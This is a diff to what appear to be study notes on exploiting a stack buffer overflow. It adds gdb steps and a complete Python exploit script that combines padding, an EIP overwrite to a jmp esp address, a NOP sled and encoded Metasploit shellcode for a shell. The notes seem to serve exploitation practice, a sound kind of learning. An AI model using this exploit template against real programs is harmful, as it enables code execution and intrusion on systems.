@@ -238,6 +238,7 @@ file
 - determin how much input executable can take
 - analyze the program to determine method to exploit
 - gdb the program to ensure overflow into pointer
+- gdb the program and run ```pdisass getuserinput```
 - utilize the address of the pointer to determine exact length of buffer
 - utilize a blank slate ```env - gdb ./func```
   - ```unset env COLUMNS```
@@ -258,6 +259,42 @@ file
 #0xf7f645fb -> 0xf7 f6 45 fb -> "\xfb\x45\xf6\xf7"
 #0xf7f6460f -> 0xf7 f6 46 0f -> "\x0f\x46\xf6\xf7"
 ```
+- set the eip as the converted bytes
+- ensure nop sled is set to ```"\x90" * 15```. the number can be between 10 and 20
+- place code from msfconsole below for shell
+### Example of script
+```
+#!/usr/bin/env python
+
+#buffer size is 62
+
+buffer = "A" * 62
+eip = "\x59\x3b\xde\xf7"
+
+# grabbing jmp esp
+# find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4i
+
+#0xf7de3b59 -> 0xf7 de 3b 59 -> "\x59\x3b\xde\xf7"
+#0xf7f588ab -> 0xf7 f5 88 ab -> "\xab\x88\xf5\xf7"
+#0xf7f645fb -> 0xf7 f6 45 fb -> "\xfb\x45\xf6\xf7"
+#0xf7f6460f -> 0xf7 f6 46 0f -> "\x0f\x46\xf6\xf7"
+
+#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
+
+nop = "\x90" * 15
+
+buf =  b""
+buf += b"\xd9\xcc\xbe\x33\xbf\x4b\xb3\xd9\x74\x24\xf4\x58"
+buf += b"\x2b\xc9\xb1\x0b\x83\xe8\xfc\x31\x70\x15\x03\x70"
+buf += b"\x15\xd1\x4a\x21\xb8\x4d\x2c\xe4\xd8\x05\x63\x6a"
+buf += b"\xac\x32\x13\x43\xdd\xd4\xe4\xf3\x0e\x46\x8c\x6d"
+buf += b"\xd8\x65\x1c\x9a\xdd\x69\xa1\x5a\x95\x01\xce\x3b"
+buf += b"\x34\xb8\x10\xeb\x95\xb3\xf0\xde\x9a"
+
+print(buffer+eip+nop+buf)
+```
+
+
 
 ### GDB demo commands
 ```
@@ -271,18 +308,8 @@ unset env LINES
 
 info proc map
 
-
 ```
-```
-find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4
 
-first 4
-
-0xf7de3b59
-0xf7f588ab
-0xf7f645fb
-0xf7f6460f
-```
 ### msfconsole stuff
 ```
 msfconsole
